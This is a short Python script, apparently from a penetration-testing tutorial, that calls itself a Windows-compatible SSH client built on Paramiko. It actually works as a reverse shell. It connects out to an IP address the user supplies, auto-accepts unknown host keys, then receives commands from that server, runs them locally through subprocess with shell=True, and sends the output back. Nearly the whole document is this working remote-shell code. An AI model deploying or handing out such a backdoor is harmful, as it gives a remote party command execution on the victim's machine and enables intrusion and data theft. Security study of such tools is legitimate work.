# A Windows-compatible SSH client using Paramiko
# Paramiko uses PyCrypto and gives simple access to the SSH2 protocol
# http://www.paramiko.org/
# https://github.com/paramiko/paramiko

import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)  # Take commands from the connection
            try:
                comd = command.decode()
                if comd == 'exit':
                    client.close()
                    break
                comd_output = subprocess.check_output(shlex.split(comd), shell=True)  # Execute the command
                ssh_session.send(comd_output or 'okay')  # Send output back to the caller
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')  # The first command we send is 'ClientConnected'
